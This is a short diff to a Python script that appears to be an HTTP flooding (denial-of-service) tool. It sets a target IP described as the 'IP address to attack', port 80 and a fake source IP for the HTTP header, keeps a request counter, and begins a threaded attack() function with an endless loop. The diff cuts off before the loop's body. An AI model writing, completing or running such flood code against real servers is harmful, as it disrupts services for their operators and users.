@@ -1,13 +1,11 @@
 import socket
 from threading import Thread
 
-TARGET_IP = "192.168.0.1"
+TARGET_IP = "x.x.x.x"       # IP address to attack
 PORT = 80
-# This value will show up as the source IP Address in the HTTP header.
-# THIS DOES NOT MAKE YOU ANONYMOUS.
-FAKE_SRC = "127.0.0.1"
+# THE VALUE BELOW DOES NOT MAKE YOU ANONYMOUS.
+FAKE_SRC = "127.0.0.1"      # The value will show up as the source IP Address in the HTTP header.
 req_count = 0
-
 
 def attack():
     while True:
